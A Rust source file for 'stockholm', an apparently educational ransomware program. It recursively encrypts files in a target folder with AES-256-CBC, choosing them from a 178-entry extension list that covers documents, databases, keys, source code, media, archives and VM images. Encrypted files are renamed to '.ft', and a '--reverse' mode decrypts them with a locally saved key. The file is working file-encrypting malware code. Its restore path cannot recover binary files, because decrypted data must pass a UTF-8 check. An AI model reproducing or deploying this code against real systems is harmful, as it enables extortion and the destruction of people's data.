use clap::{Arg, ArgAction, Command};
use libaes::Cipher;
use std::{fs, str};
use std::array::TryFromSliceError;
use std::fmt;
use std::path::{PathBuf};
use std::process::exit;
use std::time::{SystemTime, UNIX_EPOCH};
use sha2::{Sha256, Digest};
use base64::{Engine as _, engine::general_purpose};

const VERSION: &str = "v1.0";
const KEY_FILE: &str = "./stockholm.key";
const TARGET_FOLDER: &str = "./my_folder";
const TARGET_EXTENSIONS: [&str; 178] = [
	"der",
	"pfx",
	"key",
	"crt",
	"csr",
	"p12",
	"pem",
	"odt",
	"ott",
	"sxw",
	"stw",
	"uot",
	"3ds",
	"max",
	"3dm",
	"ods",
	"ots",
	"sxc",
	"stc",
	"dif",
	"slk",
	"wb2",
	"odp",
	"otp",
	"sxd",
	"std",
	"uop",
	"odg",
	"otg",
	"sxm",
	"mml",
	"lay",
	"lay6",
	"asc",
	"sqlite3",
	"sqlitedb",
	"sql",
	"accdb",
	"mdb",
	"db",
	"dbf",
	"odb",
	"frm",
	"myd",
	"myi",
	"ibd",
	"mdf",
	"ldf",
	"sln",
	"suo",
	"cs",
	"c",
	"cpp",
	"pas",
	"h",
	"asm",
	"js",
	"cmd",
	"bat",
	"ps1",
	"vbs",
	"vb",
	"pl",
	"dip",
	"dch",
	"sch",
	"brd",
	"jsp",
	"php",
	"asp",
	"rb",
	"java",
	"jar",
	"class",
	"sh",
	"mp3",
	"wav",
	"swf",
	"fla",
	"wmv",
	"mpg",
	"vob",
	"mpeg",
	"asf",
	"avi",
	"mov",
	"mp4",
	"3gp",
	"mkv",
	"3g2",
	"flv",
	"wma",
	"mid",
	"m3u",
	"m4u",
	"djvu",
	"svg",
	"ai",
	"psd",
	"nef",
	"tiff",
	"tif",
	"cgm",
	"raw",
	"gif",
	"png",
	"bmp",
	"jpg",
	"jpeg",
	"vcd",
	"iso",
	"backup",
	"zip",
	"rar",
	"7z",
	"gz",
	"tgz",
	"tar",
	"bak",
	"tbk",
	"bz2",
	"PAQ",
	"ARC",
	"aes",
	"gpg",
	"vmx",
	"vmdk",
	"vdi",
	"sldm",
	"sldx",
	"sti",
	"sxi",
	"602",
	"hwp",
	"snt",
	"onetoc2",
	"dwg",
	"pdf",
	"wk1",
	"wks",
	"123",
	"rtf",
	"csv",
	"txt",
	"vsdx",
	"vsd",
	"edb",
	"eml",
	"msg",
	"ost",
	"pst",
	"potm",
	"potx",
	"ppam",
	"ppsx",
	"ppsm",
	"pps",
	"pot",
	"pptm",
	"pptx",
	"ppt",
	"xltm",
	"xltx",
	"xlc",
	"xlm",
	"xlt",
	"xlw",
	"xlsb",
	"xlsm",
	"xlsx",
	"xls",
	"dotx",
	"dotm",
	"dot",
	"docm",
	"docb",
	"docx",
	"doc",
];

#[derive(Debug)]
enum StockholmError {
	ExtractIv(String),
	ExtractKey(String),
	ExtractPath(String),
	WriteFile(String),
	RenameFile(String),
	ReadFile(String),
	ReadDir(String),
	Utf8Decode(String),
	Base64Decode(String),
}

impl fmt::Display for StockholmError {
	fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
		match self {
			StockholmError::ExtractIv(details) => write!(f, "unable to extract iv from hash: {}", details),
			StockholmError::ExtractKey(details) => write!(f, "unable to extract key from hash: {}", details),
			StockholmError::ExtractPath(details) => write!(f, "unable to extract path: {}", details),
			StockholmError::WriteFile(details) => write!(f, "unable to write file: {}", details),
			StockholmError::RenameFile(details) => write!(f, "unable to rename file: {}", details),
			StockholmError::ReadFile(details) => write!(f, "unable to read file: {}", details),
			StockholmError::ReadDir(details) => write!(f, "unable to read directory: {}", details),
			StockholmError::Utf8Decode(details) => write!(f, "unable to decode (utf8), this is often due to a wrong key: {}", details),
			StockholmError::Base64Decode(details) => write!(f, "unable to decode (base64), file or key might be corrupted or invalid: {}", details),
		}
	}
}

fn read_key(key_file: &PathBuf) -> Result<String, StockholmError> {
	let key = fs::read(key_file).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
	String::from_utf8(key).map_err(|err| StockholmError::Utf8Decode(err.to_string()))
}

fn decode_key(key_encoded: String) -> Result<[u8;32], StockholmError> {
	let key = general_purpose::STANDARD.decode(key_encoded).map_err(|err| StockholmError::Base64Decode(err.to_string()))?;
	key[0..32].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractKey(err.to_string()))
}

fn generate_key() -> Result<[u8;32], StockholmError> {
	let mut hasher256 = Sha256::new();
	let key = whoami::hostname() +
		whoami::username().as_str() +
		SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos().to_string().as_str();
	hasher256.update(key.as_bytes());
	let key = format!("{:x}", hasher256.clone().finalize()).into_bytes();
	key[0..32].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractKey(err.to_string()))
}

fn generate_file_iv(key_encoded: &str, file_path: &str) -> Result<[u8;16], StockholmError> {
	let file_path = file_path.trim_end_matches(".ft");
	let mut hasher256 = Sha256::new();
	hasher256.update(format!("{key_encoded}{file_path}"));
	let iv = format!("{:x}", hasher256.clone().finalize()).into_bytes();
	iv[0..16].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractIv(err.to_string()))
}

fn cipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
	let file_iv = generate_file_iv(key_encoded.as_str(), file_path)?;
	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
	let file_ciphered = cipher.cbc_encrypt(&file_iv, file_data.as_slice());
	let file_encoded = general_purpose::STANDARD.encode(&file_ciphered);
	fs::write(file_path, file_encoded).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
	fs::rename(file_path, format!("{file_path}.ft")).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
	Ok(file_iv)
}

fn decipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
	let file_iv = generate_file_iv(key_encoded, file_path)?;
	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
	let file_data = general_purpose::STANDARD.decode(&file_data).map_err(|err| StockholmError::Base64Decode(err.to_string()))?;
	let file_data = cipher.cbc_decrypt(file_iv.as_slice(), &file_data);
	let file_data = String::from_utf8(file_data).map_err(|err| StockholmError::Utf8Decode(err.to_string()))?;
	let new_file_name = file_path.trim_end_matches(".ft");
	fs::write(file_path, file_data).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
	fs::rename(file_path, new_file_name).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
	Ok(file_iv)
}

fn cipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;

	for path in paths {
		if let Err(err) = path {
			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
			continue;
		}
		let path = path.unwrap().path();
		let path_string = path.to_string_lossy().to_string();
		let file_metadata = fs::metadata(path.clone());
		if let Err(err) = file_metadata {
			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
			continue;
		}
		if file_metadata.unwrap().is_dir() {
			if let Err(err) = cipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
				eprintln!("Error: can't read dir '{folder_path}': {err}");
			}
			continue;
		}
		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
		if !TARGET_EXTENSIONS.contains(&extension.as_str()) {
			if !silent { println!("Skipping: '{path_string}' (extension not supported)") }
			continue
		};
		if let Err(err) = cipher_file(&cipher, &key_encoded, path_string.as_str()) {
			eprintln!("Error: can't cipher '{path_string}': {err}", );
			continue;
		}
		if !silent { println!("Ciphered: '{path_string}'"); }
	}

	Ok(())
}

fn decipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;

	for path in paths {
		if let Err(err) = path {
			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
			continue;
		}
		let path = path.unwrap().path();
		let path_string = path.to_string_lossy().to_string();
		let file_metadata = fs::metadata(path.clone());
		if let Err(err) = file_metadata {
			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
			continue;
		}
		if file_metadata.unwrap().is_dir() {
			if let Err(err) = decipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
				eprintln!("Error: can't read dir '{folder_path}': {err}");
			}
			continue;
		}
		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
		if extension != "ft" {
			if !silent { println!("Skipping: '{path_string}' (not ciphered)") }
			continue
		};
		if let Err(err) = decipher_file(&cipher, &key_encoded, path_string.as_str()) {
			eprintln!("Error: can't decipher '{path_string}': {err}", );
			continue;
		}
		if !silent { println!("Deciphered: '{path_string}'"); }
	}

	Ok(())
}

fn cipher_command(silent: bool) {
	let key = generate_key();
	if let Err(err) = key {
		eprintln!("An error occurred while generating key: {err}");
		return;
	}
	let key = key.unwrap();
	let key_encoded = general_purpose::STANDARD.encode(&key);
	if let Err(err) = fs::write(KEY_FILE, key_encoded.clone()) {
		eprintln!("An error occurred while writing key: {err}");
		return;
	}

	let cipher = Cipher::new_256(&key);
	if let Err(err) = cipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent) {
		eprintln!("Error: can't cipher target folder '{TARGET_FOLDER}': {err}")
	}
}

fn decipher_command(key_file: &PathBuf, silent: bool) {
	let key_encoded = read_key(key_file);
	if let Err(err) = key_encoded {
		eprintln!("An error occurred while reading key: {err}");
		return;
	}
	let key_encoded = key_encoded.unwrap();
	let key = decode_key(key_encoded.clone());
	if let Err(err) = key {
		eprintln!("An error occurred while decoding key: {err}");
		return;
	}
	let key = key.unwrap();
	let cipher = Cipher::new_256(&key);
	if let Err(err) = decipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent) {
		eprintln!("Error: can't decipher target folder '{TARGET_FOLDER}': {err}")
	}}

fn main() {
	let matches = Command::new("stockholm")
		.about("encrypts the target folder")
		.arg(Arg::new("version")
			.short('v')
			.long("version")
			.action(ArgAction::SetTrue)
			.help("prints the current version"))
		.arg(Arg::new("silent")
			.short('s')
			.long("silent")
			.action(ArgAction::SetTrue)
			.help("do not print encrypted file names"))
		.arg(Arg::new("reverse")
			.short('r')
			.long("reverse")
			.value_parser(clap::value_parser!(PathBuf))
			.value_name("KEY")
			.help("decrypts the target folder"))
		.get_matches();

	if matches.get_flag("version") {
		println!("stockholm {VERSION}");
	}

	if let Some(key) = matches.get_one::<PathBuf>("reverse") {
		decipher_command(key, matches.get_flag("silent"));
		exit(0);
	}

	cipher_command(matches.get_flag("silent"));
}
